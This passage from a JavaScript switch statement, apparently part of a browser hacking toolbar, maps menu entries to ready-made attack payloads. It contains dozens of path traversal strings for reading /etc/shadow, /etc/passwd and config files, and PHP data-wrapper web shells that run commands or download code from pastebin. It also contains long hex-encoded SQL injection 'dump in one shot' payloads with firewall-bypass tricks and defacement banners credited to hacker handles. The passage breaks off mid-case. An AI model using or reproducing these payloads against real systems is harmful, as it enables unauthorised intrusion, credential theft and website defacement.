			case 'lfi617':
						txt = "../../../../../../../../../../../../etc/hosts%00";
					break;
			case 'lfi618':
						txt = "///etc/shadow";
					break;
			case 'lfi619':
						txt = "../../../../../../../../../../../../etc/shadow";
					break;
			case 'lfi620':
						txt = "/etc/shadow%00";
					break;
			case 'lfi621':
						txt = "../../../../../../../../../../../../etc/shadow%00";
					break;
			case 'lfi622':
						txt = "..\\%20\\..\\%20\\..\\%20\\../etc/passwd%00";
					break;
			case 'lfi623':
						txt = "....//....//....//....//....//....//....//....//....//....//etc/hosts";
					break;
			case 'lfi624':
						txt = "....//....//....//....//....//....//....//....//....//....//etc/hosts%00";
					break;
			case 'lfi625':
						txt = "\\etc\\group%00";
					break;
			case 'lfi626':
						txt = "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\group%00";
					break;
			case 'lfi627':
						txt = "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00";
					break;
			case 'lfi628':
						txt = "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/group%00";
					break;
			case 'lfi629':
						txt = "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00";
					break;
			case 'lfi630':
						txt = "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd%00";
					break;
			case 'lfi631':
						txt = "/../../../../../../../../../../etc/passwd^^%00";
					break;
			case 'lfi632':
						txt = "/../../../../../../../../../../etc/shadow^^%00";
					break;
			case 'lfi633':
						txt = "../\\../\\../\\../\\../\\../\\../\\etc/\\passwd%00";
					break;
			case 'lfi634':
						txt = "/./././././././././././etc/passwd%00";
					break;
			case 'lfi635':
						txt = "/./././././././././././etc/shadow%00";
					break;
			case 'lfi636':
						txt = "/./././././././././././etc/group%00";
					break;
			case 'lfi637':
						txt = "\\.\\.\\.\\.\\.\\.\\.\\.\\etc\\passwd%00";
					break;
			case 'lfi638':
						txt = "/%00//%00//%00//%00//%00/etc/passwd%00";
					break;
			case 'lfi639':
						txt = "/%00//%00//%00//%00//%00/etc/passwd%00";
					break;
			case 'lfi640':
						txt = "/%00//%00//%00//%00//%00//etc//shadow%00";
					break;
			case 'lfi641':
						txt = "/%2e%2e\\../%2e%2e\\../%2e%2e\\../%2e%2e\\../%2e%2e\\../%2e%2e\\../etc/passwd%00";
					break;
			case 'lfi642':
						txt = "..%255c..%255c..%255c..%255c..%255c..%255cetc%255cpasswd%00";
					break;
			case 'lfi643':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cpasswd%00";
					break;
			case 'lfi644':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c../etc/passwd%00";
					break;
			case 'lfi645':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cgroup%00";
					break;
			case 'lfi646':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc%5cshadow%00";
					break;
			case 'lfi347':
						txt = "..//..//..//..//..//config.php%00";
					break;
			case 'lfi648':
						txt = "..\\/..\\/..\\/..\\/config.php%00";
					break;
			case 'lfi649':
						txt = "..%5c..%5c..%5c..%5c..%5c..%5c..%5config.php%00";
					break;
			case 'lfi650':
						txt = "..%25%35%63..%25%35%63..%25%35%63config.php%00";
					break;
			case 'lfi651':
						txt = "/proc/self/environ";
					break;		
			case 'lfi652':
						txt = "///proc/self/environ";
					break;
			case 'lfi653':
						txt = "../../../proc/self/environ";
					break;
			case 'lfi654':
						txt = "/proc/self/environ%00";
					break;
			case 'lfi655':
						txt = "../../../proc/self/environ%00";
					break;
			case 'lfi656':
						txt = "../../../../../../../../../../../../proc/self/environ";
					break;
			case 'lfi657':
						txt = "../../../../../../../../../../../../proc/self/environ%00";
					break;
	//LFI Payload 
			case 'file_wrapper':
						txt = "file:///etc/passwd";
					break;
			case 'phpinput':
						txt = "php://input";
					break;
			case 'zip':
						txt = "zip://shell.jpg%23shell";
					break;
			case 'phar':
						txt = "phar://phartest.aaa%23testfile.txt";
					break;
	//LFI filter
			case 'filter1':
						txt = "php://filter/convert.base64-encode/resource=index.php";
					break;
			case 'filter2':
						txt = "php://filter/read=string.rot13/resource=index.php";
					break;
			case 'filter3':
						txt = "php://filter/zlib.deflate/resource=index.php";
					break;
			case 'filter4':
						txt = "php://filter/read=string.toupper/resource=index.php";
					break;
			case 'filter5':
						txt = "php://filter/resource=index.php";
					break;
	//PHP Expect Wrapper
			case 'expect1':
						txt = "php:expect://command here";
					break;
	//PHP data Wrapper
			case 'datawrapper_get':
						txt = "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls";
					break;
			case 'datawrapper_post':
						txt = "data://text/plain;base64,PD9waHAgZWNobyBleGVjKCRfUE9TVFsnY21kJ10pOz8+";
					break;
			case 'datawrapper_phpinfo':
						txt = "data://text/plain;base64,PD8gcGhwaW5mbygpOyA/Pg==";
					break;
			case 'datawrapper_file_get':
						txt = "data://text/plain;base64,PD9waHAgZndyaXRlKGZvcGVuKCd1cC5waHAnLCd3JyksZmlsZV9nZXRfY29udGVudHMoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9ueHVMNFNOdicpKTs/Pg==";
					break;
	//XSS via LFI Payload
			case 'xssvialfi':
						txt = "data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+";
					break;

//DIOS MYSQL Shariq /H3LL4R_H5H /Harsha Haxor/Sec7or Team /Mr.Silent coder /DHANI WAF /Dhani /Rahul R@Z /Lokomedia/Alien Shanu
		   
		    case 'Alien Shanu':
					txt = "concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e642077726974652027416c69656e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c416c69656e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f72642027416c69656e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e3020427920416c69656e205368616e753c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0xa3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c3078336336323365336336363666366537343230363336663663366637323364373236353634336532303533353134633639343734663434373332303533373936653734363137383230353632303331326533303230343237393230343136633639363536653230353336383631366537353363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c30783363373336333732363937303734336537313735363537323739336432323232336236363666373232383639336433313362363933633633366636633633366537343362363932623262323937623731373536353732373933643731373536353732373932623633366636633665363136643635356236393564326232323263333037383332333033333631333336313332333032633232336237643735373236633364373537323663326537323635373036633631363336353238323232373232326332323235333233373232323933623634366437303731373536353732373933643735373236633265373236353730366336313633363532383232343136633639363536653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c6163652822416c69656e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)";
					break;
			case 'Al!3n6m3':
					txt = "/*!50000ConCAt*//**/(0x3c63656e7465723e3c696d67207372633d2268747470733a2f2f692e6962622e636f2f59666b4d4d6d342f4d43532e706e67222077696474683d2233353022206865696768743d22333530223e,0x3c63656e7465723e3c666f6e7420636f6c6f723d626c75652073697a653d343e3c623e3c696e733e3c6c6567656e64207374796c653d22636f6c6f723a7265643b223e3e2d3d3e20496e6a656374656420427920416c69656e205368616e75207c204d616c6c7520437962657220536f6c6469657273203c3d2d3c203c2f6c6567656e643e3c2f696e733e3c6d61726b3e3c666f6e7420636f6c6f723d626c75653e7b204d4353207d3c2f666f6e743c2f6d61726b3e203c2f666f6e743e3c2f63656e7465723e3c2f623e3c62723e3c6d617271756565206265686176696f723d227363726f6c6c2220646972656374696f6e3d22766572746963616c22207363726f6c6c616d6f756e743d22313022207363726f6c6c64656c61793d223630222077696474683d2231303025223e202d2d3e204d414c4c5520435942455220534f4c444945525320212121203c2d2d203c2f666f6e743e3c623e3c2f623e3c2f6d6172717565653e3c2f666f6e743e3c62723e3c62723e,0x3c63656e7465723e3c68333e3c666f6e7420636f6c6f723d22726564223e56657273696f6e203a3a3a,version/***/(),0x3c62723e,0x55736572203a3a3a,user/**/(),0x3c62723e,0x6461746162617365203a3a3a,database/**/(),0x3c62723e,0x55554944204b657973203a3a3a,UUID/**/(),0x3c62723e,0x546d70646972203a3a3a,@@tmpdir/**/,0x3c62723e,0x64617461646972203a3a3a,@@datadir/**/,0x3c62723e,0x62617365646972203a3a3a,@@basedir/**/,0x3c62723e,0x53796d6c696e6b203a3a3a,@@GLOBAL.have_symlink/**/,0x3c62723e,0x53534c203a3a3a,@@GLOBAL.have_ssl/**/,0x3c62723e,0x706f7274203a3a3a,@@port/**/,0x3c62723e,0x736f636b6574203a3a3a,@@SOCKET/**/,0x3c62723e,0x706c7567696e646972203a3a3a,@@PLUGIN_DIR/***/,0x3c62723e7761697474696d656f7574203a3a3a,@@WAIT_TIMEOUT/***/,0x3c62723e747970656f73203a3a3a,@@VERSION_COMPILE_MACHINE/**/,0x3c62723e736572766572206f73203a3a3a,@@VERSION_COMPILE_OS/**/,0x3c62723e736574646972203a3a3a,@@CHARACTER_SETS_DIR/**/,0x3c62723e7265636f7665726f7074696f6e73203a3a3a,@@MYISAM_RECOVER_OPTIONS/**/,0x3c62723e636f6e6e656374696f6e203a3a3a,@@COLLATION_CONNECTION/**/,0x3c62723e6572726f726c6f67203a3a3a,@@LOG_ERROR/*_**/,0x3c62723e486f73746e616d65203a3a3a,@@hostname,0x3c62723e,0x3c696e733e3c64656c3e7b3c7375703e414c21334e3c2f7375703e204d414c4c5520435942455220534f4c44494552533c7375703e5348414e553c2f7375703e207d3c2f64656c3e3c2f696e733e3c2f666f6e743e,0x3c63656e7465723e3c68333e3c666f6e7420636f6c6f723d22726564223e416c69656e205368616e7520c2a920323031393c2f666f6e743e3c2f68333e3c68333e3c7072653e3c666f6e7420636f6c6f723d22626c7565223e7c204d43537c3c2f7072653e3c2f68333e2093c68333e3c7072653e3c666f6e7420636f6c6f723d22677265656e223e207c204d616c6c7520437962657220536f6c64696572737c3c2f666f6e743e3c2f7072653e3c2f68333e2093c68333e3c7072653e3c666f6e7420636f6c6f723d22677265656e223e207c20414c21334e207c3c2f666f6e743e3c2f7072653e3c2f68333e209203c62723e203c64697620636c6173733d22666f6f746572223e3c666f6e7420636f6c6f723d227768697465223e26636f70793b2032303139202d20efbfbd203c62723e3c2f6469763e203c62723e203c2f63656e7465723e209203c646976207374796c653d22646973706c61793a206e6f6e653b223e203c696672616d652077696474683d22302522206865696768743d223022207363726f6c6c696e673d226e6f22206672616d65626f726465723d226e6f22206c6f6f703d22747275652220616c6c6f773d226175746f706c617922207372633d2268747470733a2f2f632e746f7034746f702e6e65742f6d5f313038383976373562312e6d7033223e3c2f696672616d653e)";
					break;		
			case 'Alien':
					txt = "concat/*!(0x3c68323e20496e6a656374657220414c49454e205348414e553c2f68323e,0x3c62723e,version(),(Select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/";
					break;
			case 'MCS waf':
						txt = "(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))";
					break;
            case 'Cobra waf':
						txt = "concat/*!(0x223e,version(),(select(@)+from+(selecT(@:=0x00),(select(0)+from+(/*!information_Schema*/.columns)+where+(table_Schema=database())and(0x00)in(@:=concat/*!(@,0x3c62723e,table_name,0x3a3a,column_name))))x))*/";
					break;		
					
					
		    case 'Madblood':
					txt = "(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))";
					break;
			case 'M@dBl00d':
						txt = "(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))";
					break;
			
			case 'T-Pro':
					var dbName = prompt("Database Name","database()");
                    var dbNameFinal = "0x";
                    if(dbName == "database()"){dbNameFinal="database()";}
                    else{
                        // Convert DB name to hexa
                        for (var i = 0; i < dbName.length; i++){
                          dbNameFinal += dbName.charCodeAt(i).toString(16);
                        }
                    }
                    txt = "(select (@x)from(select(@x:=0x00),(@NR_TAB:=0),(select (0)from(information_schema.tables)where(table_schema=" + dbNameFinal + ")and(0x00)in(@x:=concat(@x,0x3c62723e,0x3c62723e,0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e,@tbl:=table_name,0x202d2d3e205441424c45204e7220,(@NR_TAB:=@NR_TAB%2b1),0x3c2f7370616e3e,0x3c62723e,0x3c62723e,(@NR_COL:=char(0)),0x3c7370616e207374796c653d22666f6e742d7765696768743a626f6c643b223e434f4c554d53204f46205441424c453c2f7370616e3e3c62723e,(select group_concat((@NR_COL:=@NR_COL%2b1),0x20203a2020,column_name+separator+0x3c62723e)from+information_schema.columns+where+table_schema=Database()+and+table_name=@tbl)))))x)";
                    break;
			case 'Dr.Z3r0':
					txt = "(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))";
					break;
			case 'Zen':
					txt = "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)";
					break;
			case 'MakMan':
					txt = "concat(0x3c7363726970743e6e616d653d70726f6d70742822506c6561736520456e74657220596f7572204e616d65203a2022293b2075726c3d70726f6d70742822506c6561736520456e746572205468652055726c20796f7527726520747279696e6720746f20496e6a65637420616e6420777269746520276d616b6d616e2720617420796f757220496e6a656374696f6e20506f696e742c204578616d706c65203a20687474703a2f2f736974652e636f6d2f66696c652e7068703f69643d2d3420554e494f4e2053454c45435420312c322c332c636f6e6361742830783664363136622c6d616b6d616e292c352d2d2b2d204e4f5445203a204a757374207265706c61636520796f757220496e6a656374696f6e20706f696e742077697468206b6579776f726420276d616b6d616e2722293b3c2f7363726970743e,0x3c623e3c666f6e7420636f6c6f723d7265643e53514c69474f44732053796e746178205620312e30204279204d616b4d616e3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d677265656e2073697a653d343e496e6a6563746564206279203c7363726970743e646f63756d656e742e7772697465286e616d65293b3c2f7363726970743e3c2f666f6e743e3c62723e3c7461626c6520626f726465723d2231223e3c74723e3c74643e44422056657273696f6e203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,version(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e2044422055736572203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,user(),0x203c2f666f6e743e3c2f74643e3c2f74723e3c74723e3c74643e5072696d617279204442203a203c2f74643e3c74643e3c666f6e7420636f6c6f723d626c75653e20,database(),0x203c2f74643e3c2f74723e3c2f7461626c653e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e43686f6f73652061207461626c652066726f6d207468652064726f70646f776e206d656e75203a203c2f666f6e743e3c62723e,concat(0x3c7363726970743e66756e6374696f6e20746f48657828737472297b76617220686578203d27273b666f722876617220693d303b693c7374722e6c656e6774683b692b2b297b686578202b3d2027272b7374722e63686172436f646541742869292e746f537472696e67283136293b7d72657475726e206865783b7d66756e6374696f6e2072656469726563742873697465297b6d616b73706c69743d736974652e73706c697428222e22293b64626e616d653d6d616b73706c69745b305d3b74626c6e616d653d6d616b73706c69745b315d3b6d616b7265703d22636f6e636174284946284074626c3a3d3078222b746f4865782874626c6e616d65292b222c3078302c307830292c4946284064623a3d3078222b746f4865782864626e616d65292b222c3078302c307830292c636f6e6361742830783363373336333732363937303734336537353732366333643232222b746f4865782875726c292b2232323362336332663733363337323639373037343365292c636f6e63617428636f6e6361742830783363373336333732363937303734336536343632336432322c4064622c307832323362373436323663336432322c4074626c2c3078323233623363326637333633373236393730373433652c30783363363233653363363636663665373432303633366636633666373233643732363536343365323035333531346336393437346634343733323035333739366537343631373832303536323033313265333032303432373932303464363136623464363136653363326636363666366537343365336336323732336533633632373233653534363136323663363532303465363136643635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4074626c2c3078336332663636366636653734336532303636373236663664323036343631373436313632363137333635323033613230336336363666366537343230363336663663366637323364363236633735363533652c4064622c307833633266363636663665373433653363363237323365346537353664363236353732323034663636323034333666366337353664366537333230336132303363363636663665373432303633366636633666373233643632366337353635336533633733363337323639373037343365363336663663363336653734336432322c2853454c45435420636f756e7428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d40646220616e64207461626c655f6e616d653d4074626c292c3078323233623634366636333735366436353665373432653737373236393734363532383633366636633633366537343239336233633266373336333732363937303734336533633266363636663665373433652c307833633632373233652c2873656c65637420284078292066726f6d202873656c656374202840783a3d30783030292c284063686b3a3d31292c202873656c656374202830292066726f6d2028696e666f726d6174696f6e5f736368656d612e636f6c756d6e732920776865726520287461626c655f736368656d613d3078222b746f4865782864626e616d65292b222920616e6420287461626c655f6e616d653d3078222b746f4865782874626c6e616d65292b222920616e642028307830302920696e202840783a3d636f6e6361745f777328307832302c40782c4946284063686b3d312c30783363373336333732363937303734336532303633366636633665363136643635323033643230366536353737323034313732373236313739323832393362323037363631373232303639323033643230333133622c30783230292c30783230363336663663366536313664363535623639356432303364323032322c636f6c756d6e5f6e616d652c307832323362323036393262326233622c4946284063686b3a3d322c307832302c30783230292929292978292c30783636366637323238363933643331336236393363336436333666366336333665373433623639326232623239376236343666363337353664363536653734326537373732363937343635323832323363363636663665373432303633366636633666373233643637373236353635366533653232326236393262323232653230336332663636366636653734336532323262363336663663366536313664363535623639356432623232336336323732336532323239336237643363326637333633373236393730373433652c636f6e6361742830783363363233652c307833633733363337323639373037343365373137353635373237393364323232323362363636663732323836393364333133623639336336333666366336333665373433623639326232623239376237313735363537323739336437313735363537323739326236333666366336653631366436353562363935643262323232633330373833323330333336313333363133323330326332323362376437353732366333643735373236633265373236353730366336313633363532383232323732323263323232353332333732323239336236343664373037313735363537323739336437353732366332653732363537303663363136333635323832323664363136623664363136653232326332323238373336353663363536333734323834303239323036363732366636643238373336353663363536333734323834303361336433303738333033303239323032633238373336353663363536333734323032383430323932303636373236663664323832323262363436323262323232653232326237343632366332623232323937373638363537323635323834303239323036393665323032383430336133643633366636653633363137343566373737333238333037383332333032633430326332323262373137353635373237393262323233303738333336333336333233373332333336353239323932393239363132393232323933623634366636333735366436353665373432653737373236393734363532383232336336313230363837323635363633643237323232623634366437303731373536353732373932623232323733653433366336393633366232303438363537323635323037343666323034343735366437303230373436383639373332303737363836663663363532303534363136323663363533633631336532323239336233633266373336333732363937303734336529292929223b75726c3d75726c2e7265706c616365282227222c2225323722293b75726c706173313d75726c2e7265706c61636528226d616b6d616e222c6d616b726570293b77696e646f772e6f70656e2875726c70617331293b7d3c2f7363726970743e3c73656c656374206f6e6368616e67653d22726564697265637428746869732e76616c756529223e3c6f7074696f6e2076616c75653d226d6b6e6f6e65222073656c65637465643e43686f6f73652061205461626c653c2f6f7074696f6e3e,(select (@x) from (select (@x:=0x00), (select (0) from (information_schema.tables) where (table_schema!=0x696e666f726d6174696f6e5f736368656d61) and (0x00) in (@x:=concat(@x,0x3c6f7074696f6e2076616c75653d22,UNHEX(HEX(table_schema)),0x2e,UNHEX(HEX(table_name)),0x223e,UNHEX(HEX(concat(0x4461746162617365203a3a20,table_schema,0x203a3a205461626c65203a3a20,table_name))),0x3c2f6f7074696f6e3e))))x),0x3c2f73656c6563743e),0x3c62723e3c62723e3c62723e3c62723e3c62723e)";
					break;
			case 'tr0jan WAF':
					txt = "concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a207e7472306a416e2a2044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/";
					break;
			case 'Madblood WAF':  txt = "export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.columns+where@:=export_set(5,export_set(5,@,0x3c6c693e,/*!50000column_name*/,2),0x3a3a,/*!50000table_name*/,2)),@,2)";
					break;
			case 'Madblood WAF @x':  txt = "+and@x:=concat+(@:=0,(select+count(*)/*!50000from*/information_schema.columns+where+table_schema=database()+and@:=concat+(@,0x3c6c693e,table_name,0x3a3a,column_name)),@)/*!50000UNION*/SELECT+";
					break;
			case 'tr0jan Benchmark':  txt = "concat(0x3c666f6e7420636f6c6f723d7265643e3c62723e3c62723e7e7472306a416e2a203a3a3c666f6e7420636f6c6f723d626c75653e20,version(),0x3c62723e546f74616c204e756d626572204f6620446174616261736573203a3a20,(select count(*) from information_schema.schemata),0x3c2f666f6e743e3c2f666f6e743e,0x202d2d203a2d20,concat(@sc:=0x00,@scc:=0x00,@r:=0,benchmark(@a:=(select count(*) from information_schema.schemata),@scc:=concat(@scc,0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d7265643e,LPAD(@r:=@r%2b1,3,0x30),0x2e20,(Select concat(0x3c623e,@sc:=schema_name,0x3c2f623e) from information_schema.schemata where schema_name>@sc order by schema_name limit 1),0x202028204e756d626572204f66205461626c657320496e204461746162617365203a3a20,(select count(*) from information_Schema.tables where table_schema=@sc),0x29,0x3c2f666f6e743e,0x202e2e2e20 ,@t:=0x00,@tt:=0x00,@tr:=0,benchmark((select count(*) from information_Schema.tables where table_schema=@sc),@tt:=concat(@tt,0x3c62723e,0x3c666f6e7420636f6c6f723d677265656e3e,LPAD(@tr:=@tr%2b1,3,0x30),0x2e20,(select concat(0x3c623e,@t:=table_name,0x3c2f623e) from information_Schema.tables where table_schema=@sc and table_name>@t order by table_name limit 1),0x203a20284e756d626572204f6620436f6c756d6e7320496e207461626c65203a3a20,(select count(*) from information_Schema.columns where table_name=@t),0x29,0x3c2f666f6e743e,0x202d2d3a20,@c:=0x00,@cc:=0x00,@cr:=0,benchmark((Select count(*) from information_schema.columns where table_schema=@sc and table_name=@t),@cc:=concat(@cc,0x3c62723e,0x3c666f6e7420636f6c6f723d707572706c653e,LPAD(@cr:=@cr%2b1,3,0x30),0x2e20,(Select (@c:=column_name) from information_schema.columns where table_schema=@sc and table_name=@t and column_name>@c order by column_name LIMIT 1),0x3c2f666f6e743e)),@cc,0x3c62723e)),@tt)),@scc),0x3c62723e3c62723e,0x3c62723e3c62723e)";
					break;
			case 'r0ot@h3x49':
